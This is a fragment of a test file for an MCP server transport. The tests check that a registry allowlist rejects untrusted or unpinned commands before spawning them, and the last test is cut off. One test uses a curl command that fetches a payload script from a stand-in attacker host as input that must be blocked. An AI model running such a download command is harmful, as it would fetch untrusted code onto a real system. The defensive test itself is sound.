...
import { McpGraphError, UntrustedRegistryError } from '../core/utils/errors.js'
...
describe('StdioTransport — node_wire_62250ce95b22 (spawns MCP servers with no registry allowlist check)', () => {
  it('AC1: connect() rejects with UntrustedRegistryError for a command not on the allowlist — never spawns it', async () => {
    const transport = new StdioTransport({ command: 'curl', args: ['http://evil.example/payload.sh'], type: 'stdio' })
    await expect(transport.connect()).rejects.toThrow(UntrustedRegistryError)
  })

  it('AC2: connect() rejects with UntrustedRegistryError for an unpinned npx package spec', async () => {
    const transport = new StdioTransport({ command: 'npx', args: ['some-mcp-server'], type: 'stdio' })
    await expect(transport.connect()).rejects.toThrow(UntrustedRegistryError)
  })

  it('AC3: connect() still spawns a trusted, allowlisted command (node)', async () => {
    const transport = new StdioTransport({ command: 'node', args: ['-e', 'process.exit(0)'], type: 'stdio' })
